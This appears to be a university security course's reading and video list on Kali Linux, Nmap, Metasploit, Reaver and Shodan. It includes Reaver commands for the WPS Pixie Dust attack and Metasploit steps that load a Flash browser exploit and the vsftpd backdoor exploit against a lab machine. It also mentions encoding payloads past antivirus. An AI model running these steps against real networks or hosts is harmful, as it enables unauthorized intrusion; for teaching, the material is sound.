# Readings and Videos<p>
 
## Kali introductory readings

[Kali Linux Official Documentation](https://docs.kali.org/)<br />

[Kali Linux Custom Images](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-hyperv-image-download/)<br />

[Kali Blog: Linux in the Windows App Store](https://www.kali.org/news/kali-linux-in-the-windows-app-store/)<br />

[Kali Drones, Portable CTF Builds, Raspberry Pi Craziness and More!](https://www.kali.org/news/kali-drones-portable-ctf-builds-raspberry-pi-craziness-and-more/)<br />


[Configuring and Tuning OpenVAS in Kali Linux](https://www.kali.org/tutorials/configuring-and-tuning-openvas-in-kali-linux/)<br />

[Nmap scanner gets new scripts](https://www.infoworld.com/article/3152617/security/nmap-security-scanner-gets-new-scripts-performance-boosts.html)<br />

[Mastering the Nmap Scripting Engine (video from DefCon 18, 38mins, non-obligatory)](https://www.infoworld.com/article/3152617/security/nmap-security-scanner-gets-new-scripts-performance-boosts.html)<br />


  
## Metasploit<p>

##### n.b. any ebooks are cuny-wide resources but if you have issues with the proxy please search in the JJay OneSearch [here](https://onesearch.cuny.edu/primo-explore/search?vid=jj&mode=advanced&sortby=rank&lang=en_US).<br />
[A Tour of the Metasploit Framework](http://www.ethicalhackx.com/metasploit-framework/).<br />
**Suggested brief reading:** [Metasploit for Beginners](https://www.concise-courses.com/security/metasploit-for-beginners/).<br />
[A Tour of the Metasploit Framework](http://www.ethicalhackx.com/metasploit-framework/).<br />
[Hands on with Metasploit Express (ScienceDirect)](https://doi.org/10.1016/S1353-4858(10)70092-1).<br />
[Instant Metasploit Starter (ProQuest ebook)](https://onesearch.cuny.edu/primo-explore/fulldisplay?docid=TN_ingram_myilibrary9781299802681&context=PC&vid=jj&search_scope=cunywide&tab=cuny_tab&lang=en_US).<br />
[Mastering Metasploit (ProQuest ebook)](https://onesearch.cuny.edu/primo-explore/fulldisplay?docid=TN_ingram_myilibrary9781306823425&context=PC&vid=jj&search_scope=everything&tab=default_tab&lang=en_US).<br />
[SANS Metasploit Cheatsheet](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf).<br />
[Setting up a Metasploit postgresql database](https://www.offensive-security.com/metasploit-unleashed/using-databases/).<p>
<p>


<p>
Youtube: Metasploit for Beginners<br />
  
[![thumbnail from the video](http://img.youtube.com/vi/cnkLv_RE3EI/0.jpg)](https://www.youtube.com/watch?v=cnkLv_RE3EI "MetaSploit tutorial for beginners")<p>
<p>
  

Hak5's Metasploit Minute series<br />
  
[![thumbnail from the video](http://img.youtube.com/vi/NTdthBQYa1k/0.jpg)](https://www.youtube.com/watch?v=NTdthBQYa1k "5 Ways To Get Initial Access - Metasploit Minute")<p>

Hackersploit's Metasploit For Beginners - #1 - The Basics - Modules, Exploits & Payloads<br />
  
[![thumbnail from the video](http://img.youtube.com/vi/8lR27r8Y_ik/0.jpg)](https://www.youtube.com/watch?v=8lR27r8Y_ik "Metasploit For Beginners - #1 - The Basics - Modules, Exploits & Payloads")<p>
<p>
 
## Reaver<p>
**Suggested brief reading:** [Offline Bruteforce Attack on Wifi Protected Setup](http://archive.hack.lu/2014/Hacklu2014_offline_bruteforce_attack_on_wps.pdf)<br />
 
 ##### Pixie Dust attack
 
 ![Options](https://comfy.moe/xeuglf.png)
  <p>

  
![The old way](https://www.hackingtutorials.org/wp-content/uploads/2015/06/Wordpress-screen-21-e1433583260536.jpg)
  <p>

`reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K`    
![With the pixie dust option](https://comfy.moe/hhojvn.jpg)
  <p>
 
 `reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p 39627124`
 ![With the pixie dust option - result](https://comfy.moe/tyhfos.jpg)
  
<p>
 
  ### Demonstration of using Metasploit<br />
  <br />
  start postgresql before msfconsole<br />
  searching: type and platform<br />
  <p>
  commands:<br />
  
  * search type:exploit platform:windows flash
  * help
  * use exploit/windows/browser/adobe_flash_avm2 (turns red if loaded)
  * show options (customize the attack) and set SRVPORT 80
  
  ANOTHER and BETTER EXAMPLE:
  * use ZenMap to see software running and note network topography
  * db_nmap_status, db_nmap -T4 -A -v metasploitableIP
  * show (gives lots of info)
  * show info (good place to start)
  * show payloads (shows all of the payloads available)
  * show targets
  * search vsftpd
  * use exploit/unix/ftp/vsftpd_234_backdoor
  * info
  * set RHOST 10.______
  * finish with 'check' and 'exploit'
  <p>
  Modules directory:  /usr/share/metasploit-framework<br />
  NOPS for buffer overflows<br />
  Encoding for sneaking through antivirus<br />
  post for further attacks are being pwned (keyloggers, VNC, etc.)<br />
  post/windows/gather <--btc-mining and other scripts<br />
  
  Armitage - GUI for MSF
  
  ezsploit automation
  
### Reconnaisance:<br />
[CTFR](https://github.com/UnaPibaGeek/ctfr)<p>
![CTFR](https://a.pomf.cat/qqtejp.png)
 <p>
 
### Shodan: FREE full membership with a .edu address: 
 ![Shodan](https://a.pomf.cat/tbucxr.png)
 
 Register here: https://account.shodan.io/register and email support@shodan.io from the .edu email.
  
